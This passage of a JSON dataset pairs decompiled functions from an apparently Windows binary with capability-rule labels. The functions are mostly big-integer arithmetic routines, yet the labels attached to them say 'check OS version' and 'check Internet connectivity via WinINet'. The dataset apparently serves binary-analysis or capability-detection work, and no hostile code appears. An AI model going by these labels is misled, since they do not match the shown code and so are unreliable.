        "decompiled_code": "\nint32_t __cdecl fcn.004014f0(int32_t *arg_8h, uint arg_ch, uint *arg_10h, uint32_t arg_14h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    uint32_t arg_10h_00;\n    uint var_20h;\n    \n    arg_10h_00 = arg_14h;\n    if (0x20 < arg_14h) {\n        iVar1 = fcn.00407f00(arg_10h, arg_14h, &var_20h, 0);\n        if (iVar1 != 0) goto code_r0x0040157a;\n        arg_10h = &var_20h;\n        arg_10h_00 = 0x20;\n    }\n    arg_14h = arg_14h & 0xffff0000 | CONCAT11(arg_10h_00, arg_ch);\n    arg_8h_00 = arg_8h + 1;\n    if ((*arg_8h != 0) || (iVar1 = fcn.00407f70(arg_8h_00, 0),  iVar1 == 0)) {\n        *arg_8h = 1;\n        iVar1 = fcn.00408040(arg_8h_00, &arg_14h, 2);\n        if (iVar1 == 0) {\n            iVar1 = fcn.00408040(arg_8h_00, arg_10h, arg_10h_00);\n        }\n    }\ncode_r0x0040157a:\n    fcn.00408120(&var_20h, 0x20);\n    return iVar1;\n}\n",
        "token_count": 380
    },
    "00401a90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401a90(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    uint32_t arg_10h_00;\n    uint var_40h;\n    uint var_10h;\n    \n    if (0x400 < arg_10h) {\n        return -0x36;\n    }\n    fcn.0040cc00(&var_40h, 0, 0x30);\n    if (((*(arg_8h + 0x1c) < *(arg_8h + 0x10)) || (*(arg_8h + 0x14) != 0)) &&\n       (iVar1 = fcn.00401b80(arg_8h, 0, 0),  iVar1 != 0)) {\n        return iVar1;\n    }\n    if (arg_10h != 0) {\n        pcVar2 = arg_8h + 0xf;\n        arg_10h_00 = arg_10h;\ncode_r0x00401af5:\n        do {\n            *pcVar2 = *pcVar2 + '\\x01';\n            if (*pcVar2 == '\\0') {\n                pcVar2 = pcVar2 + -1;\n                if (0 < pcVar2 + (1 - arg_8h)) goto code_r0x00401af5;\n            }\n            iVar1 = fcn.00406320(arg_8h + 0x20, 1, arg_8h, &var_10h);\n            if (iVar1 != 0) goto code_r0x00401b57;\n            if (0x10 < arg_10h) {\n                arg_10h_00 = 0x10;\n            }\n            fcn.0040cbe0(arg_ch, &var_10h, arg_10h_00);\n            arg_ch = arg_ch + arg_10h_00;\n            pcVar2 = arg_8h + 0xf;\n            arg_10h_00 = arg_10h - arg_10h_00;\n            arg_10h = arg_10h_00;\n        } while (arg_10h_00 != 0);\n    }\n    iVar1 = fcn.00401970(arg_8h, &var_40h);\n    if (iVar1 == 0) {\n        *(arg_8h + 0x10) = *(arg_8h + 0x10) + 1;\n    }\ncode_r0x00401b57:\n    fcn.00408120(&var_40h, 0x30);\n    fcn.00408120(&var_10h, 0x10);\n    return 0;\n}\n",
        "token_count": 615
    },
    "00401ce0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401ce0(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *arg_ch_00;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint *puVar6;\n    uint32_t *puVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    bool bVar12;\n    \n    puVar3 = arg_8h;\n    puVar6 = arg_ch;\n    arg_ch_00 = arg_8h;\n    if (arg_8h != arg_10h) {\n        puVar6 = arg_10h;\n        arg_ch_00 = arg_ch;\n    }\n    if ((arg_8h == arg_ch_00) || (iVar4 = fcn.00402180(arg_8h, arg_ch_00),  iVar4 == 0)) {\n        *arg_8h = 1;\n        uVar9 = puVar6[1];\n        if (uVar9 != 0) {\n            piVar5 = puVar6[2] + uVar9 * 4;\n            do {\n                piVar5 = piVar5 + -1;\n                if (*piVar5 != 0) break;\n                uVar9 = uVar9 - 1;\n            } while (uVar9 != 0);\n        }\n        if (10000 < uVar9) {\n            return -0x10;\n        }\n        if (arg_8h[1] < uVar9) {\n            iVar4 = sub.msvcrt.dll_calloc(uVar9, 4);\n            if (iVar4 == 0) {\n                return -0x10;\n            }\n            if (arg_8h[2] != 0) {\n                fcn.0040cbe0(iVar4, arg_8h[2], arg_8h[1] << 2);\n                fcn.00408120(arg_8h[2], arg_8h[1] << 2);\n                sub.msvcrt.dll_free(arg_8h[2]);\n            }\n            arg_8h[1] = uVar9;\n            arg_8h[2] = iVar4;\n        }\n        puVar10 = puVar6[2];\n        puVar7 = arg_8h[2];\n        if (uVar9 != 0) {\n            uVar8 = 0;\n            arg_ch = uVar9;\n            do {\n                uVar1 = *puVar10;\n                puVar10 = puVar10 + 1;\n                uVar2 = *puVar7;\n                uVar11 = uVar2 + uVar8 + uVar1;\n                *puVar7 = uVar11;\n                puVar7 = puVar7 + 1;\n                arg_ch = arg_ch - 1;\n                uVar8 = (uVar2 + uVar8 < uVar8) + (uVar11 < uVar1);\n            } while (arg_ch != NULL);\n            if (uVar8 != 0) {\n                arg_8h = uVar9 * 4;\n                do {\n                    uVar11 = uVar9 + 1;\n                    if (puVar3[1] <= uVar9) {\n                        if (10000 < uVar11) {\n                            return -0x10;\n                        }\n                        if (puVar3[1] < uVar11) {\n                            iVar4 = sub.msvcrt.dll_calloc(uVar11, 4);\n                            if (iVar4 == 0) {\n                                return -0x10;\n                            }\n                            if (puVar3[2] != 0) {\n                                fcn.0040cbe0(iVar4, puVar3[2], puVar3[1] << 2);\n                                fcn.00408120(puVar3[2], puVar3[1] << 2);\n                                sub.msvcrt.dll_free(puVar3[2]);\n                            }\n                            puVar3[1] = uVar11;\n                            puVar3[2] = iVar4;\n                        }\n                        puVar7 = puVar3[2] + arg_8h;\n                    }\n                    uVar9 = *puVar7 + uVar8;\n                    *puVar7 = uVar9;\n                    arg_8h = arg_8h + 4;\n                    puVar7 = puVar7 + 1;\n                    bVar12 = uVar9 < uVar8;\n                    uVar8 = uVar9 < uVar8;\n                    uVar9 = uVar11;\n                } while (bVar12);\n            }\n        }\n        iVar4 = 0;\n    }\n    return iVar4;\n}\n",
        "token_count": 1068
    },
    "00401f60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401f60(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    if (*(arg_8h + 4) == 0) {\n        return 0;\n    }\n    iVar2 = *(arg_8h + 4) + -1;\n    if (iVar2 != 0) {\n        piVar1 = *(arg_8h + 8) + iVar2 * 4;\n        do {\n            if (*piVar1 != 0) break;\n            piVar1 = piVar1 + -1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uVar3 = 0;\n    uVar4 = 0x80000000;\n    do {\n        if ((uVar4 & *(*(arg_8h + 8) + iVar2 * 4)) != 0) break;\n        uVar3 = uVar3 + 1;\n        uVar4 = uVar4 >> 1;\n    } while (uVar3 < 0x20);\n    return (iVar2 + 1) * 0x20 - uVar3;\n}\n",
        "token_count": 285
    },
    "00401fc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401fc0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    bool bVar6;\n    \n    uVar2 = *(arg_8h + 4);\n    if (uVar2 != 0) {\n        piVar3 = *(arg_8h + 8) + uVar2 * 4;\n        do {\n            piVar3 = piVar3 + -1;\n            if (*piVar3 != 0) break;\n            uVar2 = uVar2 - 1;\n        } while (uVar2 != 0);\n    }\n    uVar4 = *(arg_ch + 4);\n    if (uVar4 != 0) {\n        piVar3 = *(arg_ch + 8) + uVar4 * 4;\n        do {\n            piVar3 = piVar3 + -1;\n            if (*piVar3 != 0) break;\n            uVar4 = uVar4 - 1;\n        } while (uVar4 != 0);\n    }\n    if (uVar2 == 0) {\n        if (uVar4 == 0) {\n            return 0;\n        }\n    }\n    else if (uVar4 < uVar2) {\n        return 1;\n    }\n    if (uVar2 < uVar4) {\n        return 0xffffffff;\n    }\n    if (uVar2 != 0) {\n        puVar5 = *(arg_8h + 8) + -4 + uVar2 * 4;\n        do {\n            uVar4 = *puVar5;\n            puVar1 = (*(arg_ch + 8) - *(arg_8h + 8)) + puVar5;\n            bVar6 = uVar4 < *puVar1;\n            if (!bVar6 && uVar4 != *puVar1) {\n                return 1;\n            }\n            if (bVar6) {\n                return 0xffffffff;\n            }\n            puVar5 = puVar5 + -1;\n            uVar2 = uVar2 - 1;\n        } while (uVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 514
    },
    "004020a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004020a0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t *puVar7;\n    bool bVar8;\n    \n    uVar5 = arg_8h[1];\n    if (uVar5 != 0) {\n        piVar4 = arg_8h[2] + uVar5 * 4;\n        do {\n            piVar4 = piVar4 + -1;\n            if (*piVar4 != 0) break;\n            uVar5 = uVar5 - 1;\n        } while (uVar5 != 0);\n    }\n    uVar6 = arg_ch[1];\n    if (uVar6 != 0) {\n        piVar4 = arg_ch[2] + uVar6 * 4;\n        do {\n            piVar4 = piVar4 + -1;\n            if (*piVar4 != 0) break;\n            uVar6 = uVar6 - 1;\n        } while (uVar6 != 0);\n    }\n    if (uVar5 == 0) {\n        if (uVar6 == 0) {\n            return 0;\n        }\n    }\n    else if (uVar6 < uVar5) {\n        return *arg_8h;\n    }\n    if (uVar5 < uVar6) {\n        return -*arg_ch;\n    }\n    iVar2 = *arg_8h;\n    if (iVar2 < 1) {\n        iVar3 = *arg_ch;\n        bVar8 = iVar3 < 0;\n    }\n    else {\n        iVar3 = *arg_ch;\n        bVar8 = iVar3 < 0;\n        if (bVar8) {\n            return 1;\n        }\n    }\n    if ((iVar3 != 0 && !bVar8) && (iVar2 < 0)) {\n        return -1;\n    }\n    if (uVar5 == 0) {\n        return 0;\n    }\n    puVar7 = arg_8h[2] + -4 + uVar5 * 4;\n    while( true ) {\n        uVar6 = *puVar7;\n        puVar1 = (arg_ch[2] - arg_8h[2]) + puVar7;\n        bVar8 = uVar6 < *puVar1;\n        if (!bVar8 && uVar6 != *puVar1) {\n            return iVar2;\n        }\n        if (bVar8) break;\n        puVar7 = puVar7 + -1;\n        uVar5 = uVar5 - 1;\n        if (uVar5 == 0) {\n            return 0;\n        }\n    }\n    return -iVar2;\n}\n",
        "token_count": 643
    },
    "00402180": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402180(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (arg_8h != arg_ch) {\n        if (arg_ch[2] != 0) {\n            iVar2 = arg_ch[1] + -1;\n            if (iVar2 != 0) {\n                piVar1 = arg_ch[2] + iVar2 * 4;\n                do {\n                    if (*piVar1 != 0) break;\n                    piVar1 = piVar1 + -1;\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n            uVar3 = iVar2 + 1;\n            *arg_8h = *arg_ch;\n            if (arg_8h[1] < uVar3) {\n                if (uVar3 < 0x2711) {\n                    iVar2 = sub.msvcrt.dll_calloc(uVar3, 4);\n                    if (iVar2 != 0) {\n                        if (arg_8h[2] != 0) {\n                            fcn.0040cbe0(iVar2, arg_8h[2], arg_8h[1] << 2);\n                            fcn.00408120(arg_8h[2], arg_8h[1] << 2);\n                            sub.msvcrt.dll_free(arg_8h[2]);\n                        }\n                        arg_8h[1] = uVar3;\n                        arg_8h[2] = iVar2;\n                        goto code_r0x00402244;\n                    }\n                }\n                return 0xfffffff0;\n            }\n            fcn.0040cc00(arg_8h[2] + uVar3 * 4, 0, (arg_8h[1] - uVar3) * 4);\n            iVar2 = arg_8h[2];\ncode_r0x00402244:\n            fcn.0040cbe0(iVar2, arg_ch[2], uVar3 * 4);\n            return 0;\n        }\n        fcn.00402ff0(arg_8h);\n    }\n    return 0;\n}\n",
        "token_count": 493
    },
    "00402260": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402260(int32_t *arg_8h, uint *arg_ch, int32_t *arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint32_t *arg_8h_00;\n    int32_t iVar7;\n    ulong uVar8;\n    uint var_6ch;\n    uint var_68h;\n    uint *var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint32_t *var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    uint32_t *var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint32_t *var_14h;\n    uint32_t *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_1ch = &var_18h;\n    var_18h = 0;\n    var_24h = 1;\n    var_20h = 1;\n    iVar3 = fcn.004020a0(arg_14h, &var_24h);\n    if (iVar3 == 0) {\n        return 0xfffffff4;\n    }\n    arg_8h_00 = NULL;\n    var_30h = 1;\n    var_2ch = 0;\n    var_28h = 0;\n    var_3ch = 1;\n    var_38h = 0;\n    var_34h = 0;\n    var_60h = 1;\n    var_5ch = 0;\n    var_58h = 0;\n    var_48h = 1;\n    var_44h = 0;\n    var_40h = NULL;\n    var_54h = 1;\n    var_50h = 0;\n    var_4ch = NULL;\n    iVar3 = fcn.00401fc0(arg_10h, arg_14h);\n    if (iVar3 < 0) {\n        if ((arg_8h != NULL) && (uVar4 = fcn.00403e10(arg_8h, 0),  uVar4 != 0)) {\n            return uVar4;\n        }\n        if ((arg_ch != NULL) && (uVar4 = fcn.00402180(arg_ch, arg_10h),  uVar4 != 0)) {\n            return uVar4;\n        }\n        return 0;\n    }\n    uVar4 = fcn.00402180(&var_30h, arg_10h);\n    if ((uVar4 == 0) && (uVar4 = fcn.00402180(&var_3ch, arg_14h),  uVar4 == 0)) {\n        var_3ch = 1;\n        var_30h = 1;\n        uVar4 = fcn.00403690(&var_60h, arg_10h[1] + 2);\n        if ((uVar4 == 0) &&\n           (((uVar4 = fcn.00403e10(&var_60h, 0),  uVar4 == 0 && (uVar4 = fcn.00403690(&var_48h, 2),  uVar4 == 0)) &&\n            (uVar4 = fcn.00403690(&var_54h, 3),  arg_8h_00 = var_4ch,  uVar4 == 0)))) {\n            uVar4 = fcn.00401f60(&var_3ch);\n            if ((uVar4 & 0x1f) < 0x1f) {\n                iVar3 = 0x1f - (uVar4 & 0x1f);\n                var_18h = iVar3;\n                uVar4 = fcn.00404410(&var_30h, iVar3);\n                arg_8h_00 = var_4ch;\n                if ((uVar4 != 0) || (uVar4 = fcn.00404410(&var_3ch, iVar3),  arg_8h_00 = var_4ch,  uVar4 != 0))\n                goto code_r0x0040243e;\n            }\n            else {\n                var_18h = 0;\n            }\n            var_4h = var_2ch - 1;\n            var_ch = var_38h - 1;\n            iVar7 = var_4h - var_ch;\n            iVar3 = iVar7 * 0x20;\n            uVar4 = fcn.00404410(&var_3ch, iVar3);\n            arg_8h_00 = var_4ch;\n            if (uVar4 == 0) {\n                iVar5 = fcn.004020a0(&var_30h, &var_3ch);\n                while (-1 < iVar5) {\n                    piVar6 = var_58h + iVar7 * 4;\n                    *piVar6 = *piVar6 + 1;\n                    uVar4 = fcn.00404770(&var_30h, &var_30h, &var_3ch);\n                    arg_8h_00 = var_4ch;\n                    if (uVar4 != 0) goto code_r0x0040243e;\n                    iVar5 = fcn.004020a0(&var_30h, &var_3ch);\n                }\n                uVar4 = fcn.00404550(&var_3ch, iVar3);\n                arg_8h_00 = var_4ch;\n                if (uVar4 == 0) {\n                    if (var_ch < var_4h) {\n                        var_10h = var_34h + var_ch * 4;\n                        var_8h = iVar3 + -0x20;\n                        piVar6 = var_58h + -4 + iVar7 * 4;\n                        do {\n                            uVar4 = *(var_28h + var_4h * 4);\n                            var_14h = var_28h + var_4h * 4;\n                            uVar1 = *var_10h;\n                            if (((uVar4 < uVar1) && (uVar1 != 0)) && (uVar4 < uVar1)) {\n                                uVar8 = fcn.004013c0();\n                                iVar3 = uVar8;\n                                if (uVar8 >> 0x20 != 0) {\n                                    var_1ch = NULL;\n                                    goto code_r0x004025d0;\n                                }\n                            }\n                            else {\ncode_r0x004025d0:\n                                iVar3 = -1;\n                            }\n                            *piVar6 = iVar3 + 1;\n                            do {\n                                *piVar6 = *piVar6 + -1;\n                                uVar4 = fcn.00403e10(&var_48h, 0);\n                                if (uVar4 != 0) goto code_r0x0040243e;\n                                if (var_ch != 0) {\n                                    uVar4 = var_10h[-1];\n                                }\n                                var_6ch = 1;\n                                var_68h = 1;\n                                *var_40h = uVar4;\n                                var_40h[1] = *var_10h;\n                                var_64h = &var_1ch;\n                                var_1ch = *piVar6;\n                                uVar4 = fcn.00404130(&var_48h, &var_48h, &var_6ch);\n                                if ((uVar4 != 0) ||\n                                   (uVar4 = fcn.00403e10(&var_54h, 0),  arg_8h_00 = var_4ch,  uVar4 != 0))\n                                goto code_r0x0040243e;\n                                if (1 < var_4h) {\n                                    uVar4 = *(var_28h + -8 + var_4h * 4);\n                                }\n                                *var_4ch = uVar4;\n                                if (var_4h == 0) {\n                                    uVar4 = 0;\n                                }\n                                else {\n                                    uVar4 = var_14h[-1];\n                                }\n                                var_4ch[1] = uVar4;\n                                var_4ch[2] = *var_14h;\n                                iVar3 = fcn.004020a0(&var_48h, &var_54h);\n                            } while (0 < iVar3);\n                            uVar4 = fcn.004040f0(&var_48h, &var_3ch, *piVar6);\n                            if (((uVar4 != 0) || (uVar4 = fcn.00404410(&var_48h, var_8h),  uVar4 != 0)) ||\n                               (uVar4 = fcn.00404770(&var_30h, &var_30h, &var_48h),  uVar4 != 0)) goto code_r0x0040243e;\n                            iVar3 = fcn.00402060(&var_30h, 0);\n                            if (iVar3 < 0) {\n                                uVar4 = fcn.00402180(&var_48h, &var_3ch);\n                                if (((uVar4 != 0) || (uVar4 = fcn.00404410(&var_48h, var_8h),  uVar4 != 0)) ||\n                                   (uVar4 = fcn.00401ef0(&var_30h, &var_30h, &var_48h),  uVar4 != 0))\n                                goto code_r0x0040243e;\n                                *piVar6 = *piVar6 + -1;\n                            }\n                            piVar6 = piVar6 + -1;\n                            var_8h = var_8h + -0x20;\n                            var_4h = var_4h - 1;\n                        } while (var_ch < var_4h);\n                    }\n                    if (arg_8h != NULL) {\n                        uVar4 = fcn.00402180(arg_8h, &var_60h);\n                        if (uVar4 != 0) goto code_r0x0040243e;\n                        *arg_8h = *arg_10h * *arg_14h;\n                    }\n                    if ((arg_ch != NULL) && (uVar4 = fcn.00404550(&var_30h, var_18h),  uVar4 == 0)) {\n                        var_30h = *arg_10h;\n                        uVar4 = fcn.00402180(arg_ch, &var_30h);\n                        if ((uVar4 == 0) && (iVar3 = fcn.00402060(arg_ch, 0),  iVar3 == 0)) {\n                            *arg_ch = 1;\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0040243e:\n    iVar3 = var_28h;\n    if (var_28h != 0) {\n        fcn.00408120(var_28h, var_2ch << 2);\n        sub.msvcrt.dll_free(iVar3);\n    }\n    iVar3 = var_34h;\n    if (var_34h != 0) {\n        fcn.00408120(var_34h, var_38h << 2);\n        sub.msvcrt.dll_free(iVar3);\n    }\n    iVar3 = var_58h;\n    if (var_58h != 0) {\n        fcn.00408120(var_58h, var_5ch << 2);\n        sub.msvcrt.dll_free(iVar3);\n    }\n    puVar2 = var_40h;\n    if (var_40h != NULL) {\n        fcn.00408120(var_40h, var_44h << 2);\n        sub.msvcrt.dll_free(puVar2);\n    }\n    if (arg_8h_00 != NULL) {\n        fcn.00408120(arg_8h_00, var_50h << 2);\n        sub.msvcrt.dll_free(arg_8h_00);\n    }\n    return uVar4;\n}\n",
        "token_count": 2838
    },
    "00403cd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403cd0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = arg_8h;\n    var_ch = 1;\n    arg_8h = 0;\n    var_18h = 1;\n    var_8h = *(iVar1 + 4);\n    var_4h = *(iVar1 + 8);\n    var_10h = &arg_8h;\n    var_14h = 1;\n    iVar1 = fcn.004020a0(&var_ch, &var_18h);\n    if (iVar1 != 0) {\n        var_10h = &arg_8h;\n        arg_8h = 1;\n        var_18h = 1;\n        var_14h = 1;\n        iVar1 = fcn.004020a0(&var_ch, &var_18h);\n        if (iVar1 != 0) {\n            var_10h = &arg_8h;\n            arg_8h = 2;\n            var_18h = 1;\n            var_14h = 1;\n            iVar1 = fcn.004020a0(&var_ch, &var_18h);\n            if (iVar1 == 0) {\n                return 0;\n            }\n            iVar1 = fcn.00404960(&var_ch);\n            if (iVar1 != 0) {\n                if (iVar1 != 1) {\n                    return iVar1;\n                }\n                return 0;\n            }\n            iVar1 = fcn.00404a00(&var_ch, arg_ch, arg_10h, arg_14h);\n            return iVar1;\n        }\n    }\n    return -0xe;\n}\n",
        "token_count": 438
    },
    "00403e10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403e10(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = arg_8h[1];\n    if (iVar1 == 0) {\n        arg_8h_00 = sub.msvcrt.dll_calloc(1, 4);\n        if (arg_8h_00 == 0) {\n            return 0xfffffff0;\n        }\n        if (arg_8h[2] != 0) {\n            fcn.0040cbe0(arg_8h_00, arg_8h[2], arg_8h[1] << 2);\n            fcn.00408120(arg_8h[2], arg_8h[1] << 2);\n            sub.msvcrt.dll_free(arg_8h[2]);\n        }\n        arg_8h[1] = 1;\n        iVar1 = 1;\n        arg_8h[2] = arg_8h_00;\n    }\n    fcn.0040cc00(arg_8h[2], 0, iVar1 << 2);\n    uVar2 = arg_ch >> 0x1f;\n    *arg_8h[2] = (arg_ch ^ uVar2) - uVar2;\n    *arg_8h = (uVar2 & 0xfffffffe) + 1;\n    return 0;\n}\n",
        "token_count": 335
    },
    "00404130": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404130(int32_t *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_1ch = 1;\n    var_18h = 0;\n    var_14h = 0;\n    var_10h = 1;\n    var_ch = 0;\n    var_8h = 0;\n    if (arg_8h == arg_ch) {\n        iVar2 = fcn.00402180(&var_1ch, arg_ch);\n        if (iVar2 != 0) goto code_r0x004042d9;\n        arg_ch = &var_1ch;\n    }\n    if (arg_8h == arg_10h) {\n        iVar2 = fcn.00402180(&var_10h, arg_10h);\n        if (iVar2 == 0) {\n            arg_10h = &var_10h;\n            goto code_r0x004041b3;\n        }\n    }\n    else {\ncode_r0x004041b3:\n        iVar5 = arg_ch[1];\n        if (iVar5 != 0) {\n            piVar3 = arg_ch[2] + iVar5 * 4;\n            do {\n                piVar3 = piVar3 + -1;\n                if (*piVar3 != 0) break;\n                iVar5 = iVar5 + -1;\n            } while (iVar5 != 0);\n        }\n        iVar4 = arg_10h[1];\n        if (iVar4 != 0) {\n            piVar3 = arg_10h[2] + iVar4 * 4;\n            do {\n                piVar3 = piVar3 + -1;\n                if (*piVar3 != 0) break;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        uVar1 = iVar4 + iVar5;\n        if (uVar1 < 0x2711) {\n            if (arg_8h[1] < uVar1) {\n                var_4h = sub.msvcrt.dll_calloc(uVar1, 4);\n                if (var_4h == 0) {\n                    iVar2 = -0x10;\n                    goto code_r0x004042bc;\n                }\n                if (arg_8h[2] != 0) {\n                    fcn.0040cbe0(var_4h, arg_8h[2], arg_8h[1] << 2);\n                    fcn.00408120(arg_8h[2], arg_8h[1] << 2);\n                    sub.msvcrt.dll_free(arg_8h[2]);\n                }\n                arg_8h[2] = var_4h;\n                arg_8h[1] = iVar4 + iVar5;\n            }\n            iVar2 = fcn.00403e10(arg_8h, 0);\n            var_4h = iVar2;\n            if (iVar2 == 0) {\n                for (; var_4h = iVar2,  iVar4 != 0; iVar4 = iVar4 + -1) {\n                    fcn.00404ff0(iVar5, arg_ch[2], arg_8h[2] + iVar4 * 4 + -4, *(arg_10h[2] + -4 + iVar4 * 4));\n                    iVar2 = var_4h;\n                }\n                *arg_8h = *arg_ch * *arg_10h;\n            }\n        }\n        else {\n            iVar2 = -0x10;\n        }\n    }\ncode_r0x004042bc:\n    iVar5 = var_8h;\n    if (var_8h != 0) {\n        fcn.00408120(var_8h, var_ch << 2);\n        sub.msvcrt.dll_free(iVar5);\n    }\ncode_r0x004042d9:\n    iVar5 = var_14h;\n    if (var_14h != 0) {\n        fcn.00408120(var_14h, var_18h << 2);\n        sub.msvcrt.dll_free(iVar5);\n    }\n    return iVar2;\n}\n",
        "token_count": 1018
    },
    "00404660": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404660(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t arg_8h_00;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00401fc0(arg_ch, arg_10h);\n    if (iVar1 < 0) {\n        return -10;\n    }\n    var_10h = 1;\n    var_ch = 0;\n    var_8h = 0;\n    if (arg_8h == arg_10h) {\n        var_4h = fcn.00402180(&var_10h, arg_10h);\n        iVar1 = var_8h;\n        if (var_4h != 0) goto code_r0x0040470c;\n        arg_10h = &var_10h;\n    }\n    iVar1 = var_8h;\n    if (arg_8h != arg_ch) {\n        var_4h = fcn.00402180(arg_8h, arg_ch);\n        if (var_4h != 0) goto code_r0x0040470c;\n    }\n    *arg_8h = 1;\n    arg_8h_00 = arg_10h[1];\n    var_4h = 0;\n    if (arg_8h_00 != 0) {\n        piVar2 = arg_10h[2] + arg_8h_00 * 4;\n        do {\n            piVar2 = piVar2 + -1;\n            if (*piVar2 != 0) break;\n            arg_8h_00 = arg_8h_00 + -1;\n        } while (arg_8h_00 != 0);\n    